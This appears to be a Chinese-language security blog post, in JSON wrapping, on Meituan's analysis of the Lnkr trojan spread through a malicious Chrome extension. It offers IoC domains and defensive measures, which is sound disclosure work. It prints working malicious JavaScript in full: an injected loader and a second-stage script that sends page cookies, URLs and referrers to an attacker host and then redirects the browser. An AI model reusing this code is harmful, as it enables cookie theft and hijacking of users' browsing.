{
  "Source": "tech.meituan.com",
  "Title": "隐藏在浏览器背后的“黑手”",
  "Link": "https://tech.meituan.com/2020/12/24/lnkr-chrome.html",
  "Content": "\u003cdiv class=\"post-content\"\u003e\u003cdiv class=\"content\"\u003e\u003ch2 id=\"导读\"\u003e导读\u003c/h2\u003e\u003cp\u003e本文从黑产攻击方式、木马恶意行为、监控及防御方案等角度对Lnkr木马进行分析，此类木马影响范围较广，攻击手法多样，但国内目前相关的资料却非常稀少，希望本文的实践经验和总结能对从事相关安全检测的同学有所帮助。\u003c/p\u003e\u003ch2 id=\"一-事件概述\"\u003e一、事件概述\u003c/h2\u003e\u003cp\u003e2020年10月，美团安全运营平台发现流量中存在恶意JavaScript请求，信息安全部收到告警后立即开始应急处理，通过对网络环境、访问日志等进行排查，最终锁定恶意请求由Chrome浏览器安装恶意插件引起，该恶意JavaScript文件会窃取Cookie并强制用户跳转到恶意色情站点、推广链接等，结合美团威胁情报大数据，发现该插件与Lnkr Ad Injector木马特征吻合。\u003c/p\u003e\u003cp\u003e此类木马传播方式多样，会通过浏览器插件、Broken Link Hijacking等方式在页面中植入恶意代码，不仅严重影响用户正常访问还会窃取用户数据。经追踪分析发现，多个国内大型互联网站点（Alexa全球排名前600）被感染，影响上亿网民的上网安全，建议各大平台对自身系统第三方加载源以及内部终端设备进行检查，避免遭受此类木马攻击。\u003c/p\u003e\u003ch2 id=\"二-溯源过程\"\u003e二、溯源过程\u003c/h2\u003e\u003ch3 id=\"2-1-安全运营平台发出异常告警\"\u003e2.1 安全运营平台发出异常告警\u003c/h3\u003e\u003cp\u003eChrome沙箱监测到恶意JavaScript文件，发出异常告警：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/248debe2b1835172e0be4ac093473e3f123833.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e通过告警信息判断基本的攻击行为是：\u003c/p\u003e\u003col\u003e\u003cli\u003e用户访问正常页面；\u003c/li\u003e\u003cli\u003e页面加载外部JavaScript文件（A）：\u003ca href=\"http://s3.amazonaws.com/js-static/18ced489204f8ff908.js；\"\u003ehttp://s3.amazonaws.com/js-static/18ced489204f8ff908.js；\u003c/a\u003e\u003c/li\u003e\u003cli\u003eA加载第二个JavaScript文件（B）：\u003ca href=\"http://countsource.cool/18ced489204f8ff908.js；\"\u003ehttp://countsource.cool/18ced489204f8ff908.js；\u003c/a\u003e\u003c/li\u003e\u003cli\u003eB包含恶意代码，向远程域名发送Cookie等敏感信息。\u003c/li\u003e\u003c/ol\u003e\u003ch3 id=\"2-2-分析攻击路径\"\u003e2.2 分析攻击路径\u003c/h3\u003e\u003cp\u003e根据告警中涉及的触发页面、相关网络环境信息，排除流量劫持、XSS攻击等情况，猜测可能的原因为浏览器插件或恶意软件导致。\u003c/p\u003e\u003cp\u003e通过沙箱对问题设备上所有Chrome插件进行分析，发现一个名为Vysor的Chrome插件代码存在恶意行为，检测结果如下：\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-JavaScript\"\u003e{\n    \u0026#34;call_window_location\u0026#34;: {\n        \u0026#34;info\u0026#34;: \u0026#34;get document.location\u0026#34;,\n        \u0026#34;capture\u0026#34;: []\n    },\n    \u0026#34;call_document_createElement\u0026#34;: {\n        \u0026#34;info\u0026#34;: \u0026#34;call document.createElement, create script element\u0026#34;,\n        \u0026#34;capture\u0026#34;: [\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:INPUT\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:FIELDSET\u0026#34;,\n            \u0026#34;create element elementName:SCRIPT\u0026#34;,\n            \u0026#34;create element elementName:LINK\u0026#34;\n        ]\n    },\n    \u0026#34;call_document_removeChild\u0026#34;: {\n        \u0026#34;info\u0026#34;: \u0026#34;call document.removeChild\u0026#34;,\n        \u0026#34;capture\u0026#34;: [\n            \u0026#34;remove element {elementName:fieldset}\u0026#34;,\n            \u0026#34;remove element {elementName:fieldset}\u0026#34;,\n            \u0026#34;remove element {elementName:fieldset}\u0026#34;\n        ]\n    },\n    \u0026#34;set_scriptSrcValue\u0026#34;: {\n        \u0026#34;info\u0026#34;: \u0026#34;set script src unsafe value\u0026#34;,\n        \u0026#34;capture\u0026#34;: [\n            \u0026#34;//s3.amazonaws.com/js-static/18ced489204f8ff908.js\u0026#34;\n        ]\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到插件代码创建了script标签，然后将script标签的src属性设置为\u003ccode\u003e//s3.amazonaws.com/js-static/18ced489204f8ff908.js\u003c/code\u003e。\u003c/p\u003e\u003ch3 id=\"2-3-插件恶意代码分析\"\u003e2.3 插件恶意代码分析\u003c/h3\u003e\u003cp\u003e为了进一步研究该组织木马的特征，我们对该恶意插件的代码进行了人工分析。恶意插件的代码量较大，结构混乱，包含大量干扰代码。\u003c/p\u003e\u003cp\u003e首先恶意代码预先设置了许多无明显意义的字符串，用于构造Payload。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/3511035dcc88834b45002647c3fc12a0121063.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e这些字符串通过下面方法的一系列转换最终构造出创建script标签的语句 document[‘createElement’](‘script’)，doctype即为创建出来的script对象。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/d40768b4e2d6636f981a5c15e5aa6e86131251.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e接下来为script对象的src属性赋值，在addHandler方法中，cl这个参数由elem传递过来，其中包含src字符串，通过cl[0].split(‘\u0026gt;’).slice(2, 3)拿到关键字src，tag是上文的doctype变量也就是script对象，在构造src值这部分，可以看到在常量中有一串一部分很像是base64的字符串：\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-JavaScript\"\u003emawaid = \u0026#39;^\\\\%|PCQxPjwkMT5zM|y5hbWF6b25hd3Mu|?:^[^\\\\\\\\]+?:\\\\%\\\\.*\\t\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e恶意代码利用该字符串结合其他预设变量进行一系列转换，最终形成base64后的加载地址PCQxPjwkMT5zMy5hbWF6b25hd3MuY29tPCQxPmpzLXN0YXRpYzwkMT4xOGNlZDQ4OTIwNGY4ZmY5MDguanM：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p1.meituan.net/travelcube/f0866748b3f3549f4df6a5fc7aa219e892516.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e通过createLinkPseudo方法解base64，经过replace后形成恶意地址//s3.amazonaws.com/js-static/18ced489204f8ff908.js。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/0dbf0416ac88e26ad760d45b4a24d49877053.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003es3.amazonaws.com/js-static/18ced489204f8ff908.js的主要目的是加载下一层的恶意Javascript文件（//countsource.cool/18ced489204f8ff908.js），代码如下：\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-JavaScript\"\u003e(function(){var a=document.createElement(\u0026#34;script\u0026#34;);a.src=\u0026#34;//countsource.cool/18ced489204f8ff908.js\u0026#34;;(document.head||document.documentElement).appendChild(a)})();;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e//countsource.cool/18ced489204f8ff908.js文件内容为：\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-JavaScript\"\u003e(function () {\n    function initXMLhttp() {\n        var xmlhttp;\n        if (window.XMLHttpRequest) {\n            xmlhttp = new XMLHttpRequest();\n        } else {\n            xmlhttp = new ActiveXObject(\u0026#34;Microsoft.XMLHTTP\u0026#34;);\n        }\n        return xmlhttp;\n    }\n​\n    function minAjax(config) {\n        if (!config.url) {\n            return;\n        }\n        if (!config.type) {\n            return;\n        }\n        if (!config.method) {\n            config.method = true;\n        }\n        if (!config.debugLog) {\n            config.debugLog = false;\n        }\n        var sendString = [],\n            sendData = config.data;\n        if (typeof sendData === \u0026#34;string\u0026#34;) {\n            var tmpArr = String.prototype.split.call(sendData, \u0026#39;\u0026amp;\u0026#39;);\n            for (var i = 0, j = tmpArr.length; i \u0026lt; j; i++) {\n                var datum = tmpArr[i].split(\u0026#39;=\u0026#39;);\n                sendString.push(encodeURIComponent(datum[0]) + \u0026#34;=\u0026#34; + encodeURIComponent(datum[1]));\n            }\n        } else if (typeof sendData === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; !(sendData instanceof String)) {\n            for (var k in sendData) {\n                var datum = sendData[k];\n                if (Object.prototype.toString.call(datum) == \u0026#34;[object Array]\u0026#34;) {\n                    for (var i = 0, j = datum.length; i \u0026lt; j; i++) {\n                        sendString.push(encodeURIComponent(k) + \u0026#34;[]=\u0026#34; + encodeURIComponent(datum[i]));\n                    }\n                } else {\n                    sendString.push(encodeURIComponent(k) + \u0026#34;=\u0026#34; + encodeURIComponent(datum));\n                }\n            }\n        }\n        sendString = sendString.join(\u0026#39;\u0026amp;\u0026#39;);\n        if (window.XDomainRequest) {\n            var xmlhttp = new window.XDomainRequest();\n            xmlhttp.onload = function () {\n                if (config.success) {\n                    config.success(xmlhttp.responseText);\n                }\n            };\n            xmlhttp.open(\u0026#34;POST\u0026#34;, config.url);\n            xmlhttp.send(sendString);\n        } else {\n            var xmlhttp = initXMLhttp();\n            xmlhttp.onreadystatechange = function () {\n                if (xmlhttp.readyState == 4 \u0026amp;\u0026amp; xmlhttp.status == 200) {\n                    if (config.success) {\n                        config.success(xmlhttp.responseText, xmlhttp.readyState);\n                    }\n                } else {}\n            }\n            if (config.type == \u0026#34;GET\u0026#34;) {\n                xmlhttp.open(\u0026#34;GET\u0026#34;, config.url + \u0026#34;?\u0026#34; + sendString, config.method);\n                xmlhttp.send();\n            }\n            if (config.type == \u0026#34;POST\u0026#34;) {\n                xmlhttp.open(\u0026#34;POST\u0026#34;, config.url, config.method);\n                xmlhttp.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;);\n                xmlhttp.send(sendString);\n            }\n        }\n    }\n    dL();\n​\n    function dL() {\n        var host = \u0026#39;http://press.cdncontentdelivery.com/f\u0026#39;;\n        var config = {\n            url: host + \u0026#34;/stats.php\u0026#34;,\n            type: \u0026#34;POST\u0026#34;,\n            data: {\n                vbase: document.baseURI,\n                vhref: location.href,\n                vref: document.referrer,\n                k: \u0026#34;Y291bnRzb3VyY2UuY29vbA==\u0026#34;,\n                ck: document.cookie,\n                t: Math.floor(new Date().getTime() / 1000),\n                tg: \u0026#34;\u0026#34;\n            },\n            success: onSuccessCallback\n        };\n​\n        function bl(resp) {\n            ! function (dr) {\n                function t() {\n                    return !!localStorage \u0026amp;\u0026amp; localStorage.getItem(a)\n                }\n​\n                function e() {\n                    o(),\n                        parent.top.window.location.href = c\n                }\n​\n                function o() {\n                    var t = r + i;\n                    if (localStorage) {\n                        localStorage.setItem(a, t)\n                    }\n                }\n​\n                function n() {\n                    if (t()) {\n                        var o = localStorage \u0026amp;\u0026amp; localStorage.getItem(a);\n                        r \u0026gt; o \u0026amp;\u0026amp; e()\n                    } else e()\n                }\n                var a = \u0026#34;MenuIdentifier\u0026#34;,\n                    r = Math.floor((new Date).getTime() / 1e3),\n                    c = dr,\n                    i = 86400;\n                n()\n            }(resp);\n        }\n​\n        function onSuccessCallback(response) {\n            if (response \u0026amp;\u0026amp; response.indexOf(\u0026#39;http\u0026#39;) \u0026gt; -1) {\n                bl(response);\n            }\n        }\n        minAjax(config);\n    }\n})();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该文件是真正实现恶意行为的代码，这部分代码没有经过混淆、加密，也没有加入其他无意义的代码干扰分析，可以很清晰地看到其恶意行为：\u003c/p\u003e\u003col\u003e\u003cli\u003e获取当前页面Cookie，ck参数；\u003c/li\u003e\u003cli\u003e获取当前页面Referrer；\u003c/li\u003e\u003cli\u003e获取当前页面Location；\u003c/li\u003e\u003cli\u003e使用XMLHttpRequest将获取到的数据发送到\u003ca href=\"http://press.cdncontentdelivery.com/f/stats.php；\"\u003ehttp://press.cdncontentdelivery.com/f/stats.php；\u003c/a\u003e\u003c/li\u003e\u003cli\u003e利用onSuccessCallback方法进行跳转。\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e至此实现了将Cookie发送到远端接收地址，后续通过onSuccessCallback返回内容完成跳转，完整流程：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/910dddf6ad2933242cfa1462402e8acd83772.png\" alt=\"\"/\u003e\u003c/p\u003e\u003ch3 id=\"2-4-通过已发现的ioc深入排查\"\u003e2.4 通过已发现的IoC深入排查\u003c/h3\u003e\u003cp\u003e通过上述特征，发现大量与Lnkr木马相关的域名和插件，部分并未出现在已知的威胁情报中，经进一步分析发现，移动终端设备也有触发恶意请求的情况。\u003c/p\u003e\u003cp\u003e除此之外我们也发现国内多个大型站点在自身引用资源上引入了Lnkr木马，用户如果访问到这些站点，Cookie信息会被直接发送到远端，存在极高的安全风险。针对站点自身存在恶意资源的这类情况，极有可能是攻击者利用Broken Link Hijacking的攻击手法，对过期域名进行抢注，站点在访问原有资源时被劫持到恶意资源。\u003c/p\u003e\u003ch2 id=\"三-总结\"\u003e三、总结\u003c/h2\u003e\u003ch3 id=\"3-1-恶意域名\"\u003e3.1 恶意域名\u003c/h3\u003e\u003cp\u003e以下列举了此次检测发现的恶意域名：\u003c/p\u003e\u003col\u003e\u003cli\u003emirextpro.com\u003c/li\u003e\u003cli\u003ebrowfileext.com\u003c/li\u003e\u003cli\u003enextextlink.com\u003c/li\u003e\u003cli\u003elisegreen.biz\u003c/li\u003e\u003cli\u003emakesure.biz\u003c/li\u003e\u003cli\u003eclipsold.com\u003c/li\u003e\u003cli\u003ecomtakelink.xyz\u003c/li\u003e\u003cli\u003eprotesidenext.com\u003c/li\u003e\u003cli\u003epromfflinkdev.com\u003c/li\u003e\u003cli\u003erayanplug.xyz\u003c/li\u003e\u003cli\u003ecountsource.cool\u003c/li\u003e\u003cli\u003eblancfox.com\u003c/li\u003e\u003cli\u003eskipush1.bbn.com.cn\u003c/li\u003e\u003cli\u003edonewrork.org\u003c/li\u003e\u003cli\u003eloungesrc.net\u003c/li\u003e\u003cli\u003ehigedev.cool\u003c/li\u003e\u003cli\u003es3.amazonaws.com/cashe-js/\u003c/li\u003e\u003cli\u003es3.amazonaws.com/js-cache/\u003c/li\u003e\u003cli\u003es3.amazonaws.com/jsfile/\u003c/li\u003e\u003cli\u003es3.amazonaws.com/cashe-js/\u003c/li\u003e\u003cli\u003ecdngateway.net（接收Cookie域名）\u003c/li\u003e\u003cli\u003esslproviders.net （接收Cookie域名）\u003c/li\u003e\u003cli\u003ecdncontentdelivery.com （接收Cookie域名）\u003c/li\u003e\u003c/ol\u003e\u003ch3 id=\"3-2-恶意插件\"\u003e3.2 恶意插件\u003c/h3\u003e\u003cp\u003e排查到包含Lnkr木马特征的恶意插件：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/c0f580a25f8080d6c717996ea0d65b3b233329.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e部分恶意插件截图：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p1.meituan.net/travelcube/3dc6409b36a3b75cd2078a81b001e28d146835.png\" alt=\"\"/\u003e\u003c/p\u003e\u003ch2 id=\"四-复盘\"\u003e四、复盘\u003c/h2\u003e\u003cp\u003e\u003cstrong\u003eLnkr木马所造成的危害有哪些？\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eLnkr木马的核心域名之一cdngateway.net在全球域名流量排名8900位，从流量来源角度，通过外部网站跳转带来的流量占比总流量的65.48%，可见其攻击范围极广，受其影响的应用、用户数量也是非常庞大的。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/01678b711eac710c2a8dda12e4da55f9133894.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/8347a27ef500ca82cbc4e03f2d776d75100169.png\" alt=\"\"/\u003e\u003c/p\u003e\u003cp\u003e此类木马对外部用户和内部员工访问同时具有严重危害。\u003c/p\u003e\u003cp\u003e在外部用户方面，如果企业没有严格控制系统第三方资源加载，黑产利用Broken Link Hijacking的攻击手法，致使业务系统加载资源时被劫持植入恶意代码，将严重影响用户体验、信息安全和企业形象。\u003c/p\u003e\u003cp\u003e从内部员工角度，传统杀软、EDR等终端安全设备并不能很好地识别出此类恶意插件，攻击者通过传播恶意浏览器插件控制员工浏览器加载远程恶意资源，不仅仅可以用于广告注入，相较于针对浏览器的其他攻击方式，可以达到更稳定，触发面更广的敏感信息窃取、内网探测等，在CSP历史阻断的恶意请求中，我们也发现除窃取Cookie信息外，也存在恶意代码窃取页面文本信息的情况，这些文本信息在企业内部平台中，极有可能包含大量用户，订单等敏感信息。\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e如何发现此类恶意木马植入？\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e针对恶意浏览器插件，在检测方面对其代码做静态分析成本比较大，触发恶意请求的Payload都是通过大量编码转换、拼接、正则匹配等构造而成、且经过了很多没有实际意义的方法，在动态分析方面，由于Chrome插件代码会调用Chrome后台API，在常规沙箱环境中可能会出现无法调用API而中途报错退出。分析中还发现，很多恶意行为需要触发特定事件才能进入到构造恶意Payload流程，如触发chrome.tabs.onUpdated等。\u003c/p\u003e\u003cp\u003e对于浏览器插件安全，可以通过以下方式进行检测及防护：\u003c/p\u003e\u003cul\u003e\u003cli\u003e禁止安装未在Chrome应用商店上线的插件（公司内部开发的插件除外）；\u003c/li\u003e\u003cli\u003e对插件manfiest.json文件进行轻量级的排查，manfiest.json文件中申请权限相对敏感，如Cookie、tabs、webRequest等等；\u003c/li\u003e\u003cli\u003e利用内容安全策略（CSP）对应用页面发起的请求进行拦截或监控，结合静态与动态分析技术，判断JavaScript文件行为；\u003c/li\u003e\u003cli\u003e利用浏览器沙箱与EDR，定期对浏览器插件进行扫描；\u003c/li\u003e\u003cli\u003e构建网络层的检测能力，发现有恶意请求及时应急处理。\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e对于业务系统自身是否加载恶意资源方面：\u003c/p\u003e\u003cul\u003e\u003cli\u003e严格控制系统加载的第三方资源；\u003c/li\u003e\u003cli\u003e通过内容安全策略（CSP）对页面触发的请求进行拦截或监控。\u003c/li\u003e\u003c/ul\u003e\u003ch2 id=\"总结\"\u003e总结\u003c/h2\u003e\u003cp\u003e黑产组织利用此类木马进行恶意引流、窃取用户信息等，给用户访问带来安全风险，也危害到企业自身形象，在HTTPS场景下，虽然排除了链路上用户访问被劫持的风险，但用户端访问环境安全性不定，为确保用户获取的信息可靠，没有被篡改，仍然需要进一步加强防护。希望本文能给大家带来一些帮助或者启发。\u003c/p\u003e\u003ch2 id=\"关于美团信息安全部\"\u003e关于美团信息安全部\u003c/h2\u003e\u003cp\u003e\u003cimg src=\"https://p0.meituan.net/travelcube/f90dc7ac796a93ff5d572308ecc02b38123187.jpg\" alt=\"\"/\u003e\u003c/p\u003e\u003ch2 id=\"招聘信息\"\u003e招聘信息\u003c/h2\u003e\u003cp\u003e目前美团安全团队正在努力打造语言虚拟机—基础服务—上层应用的纵深应用安全体系，急需对研发安全感兴趣的同学加入！如果你正好有求职意向且满足以下岗位要求，欢迎投递简历至sunny.fang@meituan.com（邮件主题请注明：研发安全专家-城市-美团SRC）。\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e",
  "Date": "2020-12-24T00:00:00Z",
  "Author": "soulteary@gmail.com"
}